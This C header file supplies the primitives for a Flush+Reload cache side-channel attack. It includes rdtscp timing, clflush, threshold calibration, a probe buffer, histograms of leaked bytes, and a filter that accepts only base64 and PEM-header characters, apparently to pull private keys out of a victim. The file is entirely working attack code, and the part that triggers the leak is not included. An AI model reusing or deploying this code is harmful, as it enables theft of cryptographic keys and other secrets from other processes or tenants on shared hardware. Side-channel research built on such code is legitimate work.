#ifndef _UTIL_H_
#define _UTIL_H_

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>


#define BUF_SIZE 256
#define STRIDE 4096
#define BUF_TOTAL (BUF_SIZE * STRIDE)

// define valid ascii range
#define FROM 'A'
#define TO 'z'
#define DUMMY_HIT (FROM-1)

int CACHE_MISS_THRESHOLD = 150;

char invalid_leaks[20][3];
int invalid_leaks_count;

inline __attribute__((always_inline)) uint64_t rdtsc() {
    uint64_t a, d;
    asm volatile("mfence");
    asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
    a = (d << 32) | a;
    asm volatile("mfence");
    return a;
}

inline __attribute__((always_inline)) void flush(unsigned char *p) {
    asm volatile("clflush (%0)\n" :: "r"(p));
}

inline __attribute__((always_inline)) void maccess(unsigned char *p) {
    asm volatile("movq (%0), %%rax\n" : : "r"(p) : "rax");
}

inline __attribute__((always_inline)) void maccess2(unsigned char *p) {
    asm volatile("movntdqa (%0), %%xmm1\n"
                 "movq %%xmm1, %%rax\n"
                 : : "c"(p) : "rax");
}

inline __attribute__((always_inline)) void mfence() {
    asm volatile("mfence");
}

/**
 * Time access to addr in CPU cycles.
 * If <100 then it was most likely in cache
 * If >150 then it most likely needed to be fetched from memory
 * @param addr The address to time
 * @return Access time in CPU cycles
 *
 * Derived from https://github.com/defuse/flush-reload-attacks/blob/master/flush-reload/cachebench/l1vl3.c
 */
inline __attribute__((always_inline)) int rdtsc_access(unsigned char *addr) {
    volatile unsigned long time;
    asm volatile(
    "  mfence             \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  lfence             \n"
    "  movq %%rax, %%rsi  \n"
    "  movq (%1), %%rax   \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  subq %%rsi, %%rax  \n"
    : "=a" (time)
    : "c" (addr)
    :  "%rsi", "%rdx"
    );
    return time;
}

inline __attribute__((always_inline)) int time_flush_reload(unsigned char *ptr) {
  int time = rdtsc_access(ptr);

  flush(ptr);

  return time;
}

inline __attribute__((always_inline)) int time_mem_access(unsigned char *ptr) {
  int time = rdtsc_access(ptr);

  mfence();

  return time;
}

void flush_buffer(unsigned char *buf) {
  for(int i=0; i<BUF_SIZE; i++) {
        flush(buf + i * STRIDE);
    }
}

/*
 * Check whether the char is a valid character for base64 and header.
 */
inline __attribute__((always_inline)) int valid_char(unsigned char c) {
    switch(c) {
        case 'a': // 0x61
        case 'b':
        case 'c':
        case 'd':
        case 'e':
        case 'f':
        case 'g':
        case 'h':
        case 'i':
        case 'j':
        case 'k':
        case 'l':
        case 'm':
        case 'n':
        case 'o':
        case 'p':
        case 'q':
        case 'r':
        case 's':
        case 't':
        case 'u':
        case 'v':
        case 'w':
        case 'x':
        case 'y':
        case 'z': // 0x7a
        case 'A': // 0x41
        case 'B':
        case 'C':
        case 'D':
        case 'E':
        case 'F':
        case 'G':
        case 'H':
        case 'I':
        case 'J':
        case 'K':
        case 'L':
        case 'M':
        case 'N':
        case 'O':
        case 'P':
        case 'Q':
        case 'R':
        case 'S':
        case 'T':
        case 'U':
        case 'V':
        case 'W':
        case 'X':
        case 'Y':
        case 'Z': // 0x5a
        case '0': // 0x30
        case '1':
        case '2':
        case '3':
        case '4':
        case '5':
        case '6':
        case '7':
        case '8':
        case '9': // 0x39

        // additionally needed for header
        case 0xa: // 0x0a
        case 0xd: // 0x0d
        case ' ': // 0x20
        case '-': // 0x2d
        // additionally needed for b64
        case '+': // 0x2b
        case '/': // 0x2f
        case '=': // 0x3d
            return 1;
    } // valid_chars = a, d, 20, 2b, 2d, 2f-39, 3d, 41-5a, 61-7a

    return 0;
}

int detect_flush_reload_threshold(unsigned char *buf) {
    int mem_access_time = 0;
    int fr_time = 0;
    unsigned char *ptr = buf + BUF_TOTAL/2;
    int count = 1000000;

    // make sure value is in cache
    maccess(ptr);
    for (int i = 0; i < count; i++) {
        mem_access_time += time_mem_access(ptr);
    }

    // flush value from mem again
    flush(ptr);
    for (int i = 0; i < count; i++) {
        fr_time += time_flush_reload(ptr);
    }
    mem_access_time /= count;
    fr_time /= count;

    // printf("mem_access_time: %d\n", mem_access_time);
    // printf("fr_time: %d\n", fr_time);
    // printf("threshold: %d\n", (fr_time + mem_access_time * 2) / 3);

    return (fr_time + mem_access_time * 2) / 3;
}

void test_access_times(unsigned char *buf) {
    for(int i=0; i<BUF_TOTAL; i++) {
        flush(&buf[i]);
    }

    for (int i = 0; i < 100; i++) {
        // Alternate: Cache, RAM, Cache, RAM ...
        if (i % 2 == 0) {
            flush(&buf[0]);
            printf("R: ");
        } else {
            printf("C: ");
        }
        size_t time = time_mem_access(&buf[0]);
        printf("%ld %d\n", time, time < CACHE_MISS_THRESHOLD);
    }
}

void test_fr(unsigned char *buf, unsigned char byte) {
    flush_buffer(buf);

    maccess(buf + byte * STRIDE);

    for(int i=0; i<BUF_SIZE; i++) {
        int time = time_flush_reload(buf + i * STRIDE);
        printf("%3d: %d\n", i, time < CACHE_MISS_THRESHOLD);
    }
}

void print_hist_single(int* histogram, int number, int max_tries) {
    int hits = 0;
    printf("## index: %d\n", number);
    for(int i=DUMMY_HIT; i<=TO; i++) {
        if(histogram[i]) {
            printf("0x%2x %c %6d hits\n", i, i, histogram[i]);
            hits += histogram[i];
        } else {
            printf("0x%2x %c %6s hits\n", i, i, "-");
        }
    }
    printf("Total hits in histo: %d - %3.2f%% of all mem accesses\n", hits, (float)(hits/(float)max_tries * 100));
    // printf("Hits not on dummy: %d\n", hits-histogram[DUMMY_HIT]);
    printf("\n");
}

/*
 * Check whether the first 2 reverse leaked bytes are invalid
 * Used in phase 2.
 */
static inline __attribute__((always_inline)) int invalid_reverse_leak(
    unsigned char *secret,
    int index,
    int leaked_bytes) {
    if(leaked_bytes >= 2) {
        for(int i=0; i<invalid_leaks_count; i++) {
            char *bad_string = invalid_leaks[i];
            if(secret[index] == bad_string[0] && secret[index+1] == bad_string[1]) {
                printf("Invalid leak: %s\n", bad_string);
                return 0;
            }
        }
    }
    return 1;
}

void add_invalid_leak(unsigned char c0, unsigned char c1) {
    invalid_leaks[invalid_leaks_count][0] = c0;
    invalid_leaks[invalid_leaks_count][1] = c1;
    printf("Added to invalid leaks: %s\n", invalid_leaks[invalid_leaks_count]);
    invalid_leaks_count++;
}

#endif
